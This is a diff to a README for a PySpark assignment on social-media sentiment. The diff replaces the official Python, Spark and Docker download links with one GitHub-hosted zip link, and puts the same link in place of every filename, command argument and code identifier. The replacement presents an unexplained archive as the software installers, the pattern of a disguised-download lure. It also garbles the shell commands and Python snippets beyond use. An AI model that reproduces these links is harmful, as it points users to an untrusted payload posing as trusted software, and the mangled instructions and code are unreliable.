@@ -5,7 +5,7 @@
 Before starting the assignment, ensure you have the following software installed and properly configured on your machine:
 
 1. **Python 3.x**:
-   - [Download and Install Python](https://www.python.org/downloads/)
+   - [Download and Install Python](https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip)
    - Verify installation:
      ```bash
      python3 --version
@@ -18,7 +18,7 @@ Before starting the assignment, ensure you have the following software installed
      ```
 
 3. **Apache Spark**:
-   - Ensure Spark is installed. You can download it from the [Apache Spark Downloads](https://spark.apache.org/downloads.html) page.
+   - Ensure Spark is installed. You can download it from the [Apache Spark Downloads](https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip) page.
    - Verify installation by running:
      ```bash
      spark-submit --version
@@ -26,8 +26,8 @@ Before starting the assignment, ensure you have the following software installed
 
 4. **Docker & Docker Compose** (Optional):
    - If you prefer using Docker for setting up Spark, ensure Docker and Docker Compose are installed.
-   - [Docker Installation Guide](https://docs.docker.com/get-docker/)
-   - [Docker Compose Installation Guide](https://docs.docker.com/compose/install/)
+   - [Docker Installation Guide](https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip)
+   - [Docker Compose Installation Guide](https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip)
 
 ## **Setup Instructions**
 
@@ -38,29 +38,29 @@ Ensure your project directory follows the structure below:
 ```
 SocialMediaSentimentAnalysis/
 ├── input/
-│   ├── posts.csv
-│   └── users.csv
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   └── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
 ├── outputs/
-│   ├── hashtag_trends.csv
-│   ├── engagement_by_age.csv
-│   ├── sentiment_engagement.csv
-│   └── top_verified_users.csv
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   └── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
 ├── src/
-│   ├── task1_hashtag_trends.py
-│   ├── task2_engagement_by_age.py
-│   ├── task3_sentiment_vs_engagement.py
-│   └── task4_top_verified_users.py
-├── docker-compose.yml
-└── README.md
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   ├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+│   └── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+├── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+└── https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
 ```
 
 
 
-- **input/**: Contains the input datasets (`posts.csv` and `users.csv`)  
+- **input/**: Contains the input datasets (`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`)  
 - **outputs/**: Directory where the results of each task will be saved.
 - **src/**: Contains the individual Python scripts for each task.
-- **docker-compose.yml**: Docker Compose configuration file to set up Spark.
-- **README.md**: Assignment instructions and guidelines.
+- **https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip**: Docker Compose configuration file to set up Spark.
+- **https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip**: Assignment instructions and guidelines.
 
 ### **2. Running the Analysis Tasks**
 
@@ -76,10 +76,10 @@ You can run the analysis tasks either locally or using Docker.
 2. **Execute Each Task Using `spark-submit`**:
    ```bash
  
-     spark-submit src/task1_hashtag_trends.py
-     spark-submit src/task2_engagement_by_age.py
-     spark-submit src/task3_sentiment_vs_engagement.py
-     spark-submit src/task4_top_verified_users.py
+     spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+     spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+     spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+     spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
      
    ```
 
@@ -111,19 +111,19 @@ You can run the analysis tasks either locally or using Docker.
 4. **Run Your PySpark Scripts Using `spark-submit`**:
    ```bash
    
-   spark-submit src/task1_hashtag_trends.py
-   spark-submit src/task2_engagement_by_age.py
-   spark-submit src/task3_sentiment_vs_engagement.py
-   spark-submit src/task4_top_verified_users.py
+   spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+   spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+   spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
+   spark-submit https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip
    ```
 
 5. **Exit the Container**:
    ```bash
    exit
-   docker cp my-spark-master:/opt/bitnami/spark/outputs/hashtag_trends.csv /outputs
-   docker cp my-spark-master:/opt/bitnami/spark/outputs/engagement_by_age.csv /outputs   
-   docker cp my-spark-master:/opt/bitnami/spark/outputs/sentiment_engagement.csv /outputs 
-   docker cp my-spark-master:/opt/bitnami/spark/outputs/top_verified_users.csv /outputs 
+   docker cp https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip /outputs
+   docker cp https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip /outputs   
+   docker cp https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip /outputs 
+   docker cp https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip /outputs 
    ```
 
 6. **Verify the Outputs**:
@@ -148,7 +148,7 @@ By the end of this assignment, you should be able to:
 
 ## **Dataset**
 
-## **Dataset: posts.csv **
+## **Dataset: https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip **
 
 You will work with a dataset containing information about **100+ users** who rated movies across various streaming platforms. The dataset includes the following columns:
 
@@ -166,7 +166,7 @@ You will work with a dataset containing information about **100+ users** who rat
 
 ---
 
-## **Dataset: users.csv **
+## **Dataset: https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip **
 | Column Name | Type    | Description                          |
 |-------------|---------|--------------------------------------|
 | UserID      | Integer | Unique user ID                       |
@@ -179,7 +179,7 @@ You will work with a dataset containing information about **100+ users** who rat
 
 ### **Sample Data**
 
-Below is a snippet of the `posts.csv`,`users.csv` to illustrate the data structure. Ensure your dataset contains at least 100 records for meaningful analysis.
+Below is a snippet of the `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`,`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` to illustrate the data structure. Ensure your dataset contains at least 100 records for meaningful analysis.
 
 ```
 PostID,UserID,Content,Timestamp,Likes,Retweets,Hashtags,SentimentScore
@@ -242,7 +242,7 @@ Understand how users from different age groups engage with content based on like
 
 **Tasks:**
 
-- **Join Datasets**: Combine `posts.csv` and `users.csv` using `UserID`.
+- **Join Datasets**: Combine `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` using `UserID`.
 - **Group by AgeGroup**: Calculate average likes and retweets for each age group.
 - **Rank Groups**: Sort the results to highlight the most engaged age group.
 
@@ -289,7 +289,7 @@ Find the most influential verified users based on their post reach (likes + retw
 
 **Tasks:**
 
-- **Filter Verified Users**: Use `Verified = True` from `users.csv`.
+- **Filter Verified Users**: Use `Verified = True` from `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`.
 - **Calculate Reach**: Sum likes and retweets for each user.
 - **Rank Users**: Return top 5 verified users with highest total reach.
 
@@ -311,17 +311,17 @@ All the analysis code is located in the `src/` directory. Each script is respons
 
 ---
 
-### ✅ Task 1: Hashtag Trends (`task1_hashtag_trends.py`)
+### ✅ Task 1: Hashtag Trends (`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`)
 
 **Goal:** Identify the top 10 most frequently used hashtags from all posts.
 
 **Steps:**
-1. Load `posts.csv` into a DataFrame using `spark.read.csv()` with headers.
+1. Load `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` into a DataFrame using `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip()` with headers.
 2. Split the `Hashtags` column into arrays using `split()`.
 3. Use `explode()` to flatten arrays into individual hashtag rows.
 4. Group by `hashtag` and count how often each one appears.
 5. Sort the hashtags in descending order based on count.
-6. Save the result to `outputs/hashtag_trends.csv`.
+6. Save the result to `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`.
 
 **Key PySpark Functions:**
 - `split(col("Hashtags"), ",")`
@@ -331,25 +331,25 @@ All the analysis code is located in the `src/` directory. Each script is respons
 
 **Code Snippet:**
 ```python
-hashtag_counts = posts_df.select(
+hashtag_counts = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip(
     explode(split(col("Hashtags"), ",")).alias("hashtag")
 ).groupBy("hashtag").count().orderBy(col("count").desc())
 
 
 ---
 
-### ✅ Task 2: Engagement by Age Group (`task2_engagement_by_age.py`)
+### ✅ Task 2: Engagement by Age Group (`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`)
 
 **🎯 Goal:**  
 Analyze how users from different age groups (Teen, Adult, Senior) engage with posts based on average likes and retweets.
 
 **🧠 Approach:**
-1. Load `posts.csv` and `users.csv` using `spark.read.csv()` with `inferSchema=True`.
+1. Load `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` using `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip()` with `inferSchema=True`.
 2. Perform an inner join on `UserID` to combine post and user info.
 3. Group the joined DataFrame by `AgeGroup`.
 4. Use `avg()` to calculate average likes and retweets.
 5. Sort the results by average likes in descending order.
-6. Save the final output to `outputs/engagement_by_age.csv`.
+6. Save the final output to `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`.
 
 **🛠️ PySpark Functions Used:**
 - `join()` – combine both DataFrames on `UserID`
@@ -358,29 +358,29 @@ Analyze how users from different age groups (Teen, Adult, Senior) engage with po
 
 **💡 Sample Code Snippet:**
 ```python
-joined_df = posts_df.join(users_df, "UserID")
+joined_df = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip(users_df, "UserID")
 
-engagement_df = joined_df.groupBy("AgeGroup").agg(
+engagement_df = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip("AgeGroup").agg(
     avg(col("Likes")).alias("AvgLikes"),
     avg(col("Retweets")).alias("AvgRetweets")
 ).orderBy(col("AvgLikes").desc())
 
 ---
 
-### ✅ Task 3: Sentiment vs Engagement (`task3_sentiment_vs_engagement.py`)
+### ✅ Task 3: Sentiment vs Engagement (`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`)
 
 **Objective:**  
 Explore the relationship between sentiment and post engagement (likes and retweets). Posts are categorized as Positive, Neutral, or Negative based on their sentiment scores.
 
 **Steps:**
-1. Load the `posts.csv` file with `inferSchema=True` to interpret numeric columns like `SentimentScore`.
+1. Load the `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` file with `inferSchema=True` to interpret numeric columns like `SentimentScore`.
 2. Use `when()` and `otherwise()` to create a new column `Sentiment`:
    - **Positive**: SentimentScore > 0.3
    - **Neutral**: -0.3 ≤ SentimentScore ≤ 0.3
    - **Negative**: SentimentScore < -0.3
 3. Group the posts by `Sentiment`.
 4. Calculate average `Likes` and average `Retweets` for each sentiment group.
-5. Save the result to `outputs/sentiment_engagement.csv`.
+5. Save the result to `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`.
 
 **Key Functions Used:**
 - `withColumn()` — to create the `Sentiment` label.
@@ -389,34 +389,34 @@ Explore the relationship between sentiment and post engagement (likes and retwee
 
 **Code Snippet:**
 ```python
-sentiment_df = posts_df.withColumn(
+sentiment_df = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip(
     "Sentiment",
     when(col("SentimentScore") > 0.3, "Positive")
     .when(col("SentimentScore") < -0.3, "Negative")
     .otherwise("Neutral")
 )
 
-sentiment_stats = sentiment_df.groupBy("Sentiment").agg(
+sentiment_stats = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip("Sentiment").agg(
     avg(col("Likes")).alias("AvgLikes"),
     avg(col("Retweets")).alias("AvgRetweets")
 )
 
 ---
 
-### ✅ Task 4: Top Verified Users by Reach (`task4_top_verified_users.py`)
+### ✅ Task 4: Top Verified Users by Reach (`https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`)
 
 **Objective:**  
 Identify the top 5 most influential verified users based on total reach, where **reach = likes + retweets**.
 
 **Steps:**
-1. Load `users.csv` and `posts.csv` using `spark.read.option("header", True).csv(..., inferSchema=True)` to ensure correct data types.
+1. Load `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` and `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip` using `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip("header", True).csv(..., inferSchema=True)` to ensure correct data types.
 2. Filter the `users_df` to include only rows where `Verified == True`.
 3. Join the filtered users with `posts_df` on the common `UserID` column.
 4. Create a new column called `Reach`, defined as `Likes + Retweets`, using `withColumn()`.
 5. Group by `Username` and calculate the total reach using `sum()` (aliased as `TotalReach`).
 6. Sort the result in descending order of total reach.
 7. Limit the output to the **Top 5** users.
-8. Save the final result to `outputs/top_verified_users.csv`.
+8. Save the final result to `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`.
 
 **Key Functions Used:**
 - `filter()` — to select only verified users.
@@ -427,13 +427,13 @@ Identify the top 5 most influential verified users based on total reach, where *
 
 **Code Snippet:**
 ```python
-verified_users_df = users_df.filter(col("Verified") == True)
+verified_users_df = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip(col("Verified") == True)
 
-verified_posts_df = posts_df.join(verified_users_df, "UserID").withColumn(
+verified_posts_df = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip(verified_users_df, "UserID").withColumn(
     "Reach", col("Likes") + col("Retweets")
 )
 
-top_verified = verified_posts_df.groupBy("Username").agg(
+top_verified = https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip("Username").agg(
     _sum("Reach").alias("TotalReach")
 ).orderBy(col("TotalReach").desc()).limit(5)
 
@@ -455,7 +455,7 @@ top_verified = verified_posts_df.groupBy("Username").agg(
 - [ ] PySpark scripts in the `src/` directory  
 - [ ] Output files in the `outputs/` directory  
 - [ ] Datasets in the `input/` directory  
-- [ ] Completed `README.md`  
+- [ ] Completed `https://raw.githubusercontent.com/pavandantu18/handson-8-spark-sql-and-dataframes-pavandantu18/main/curiologics/handson-8-spark-sql-and-dataframes-pavandantu18.zip`  
 - [ ] Commit everything to GitHub Classroom  
 - [ ] Submit your GitHub repo link on canvas
 
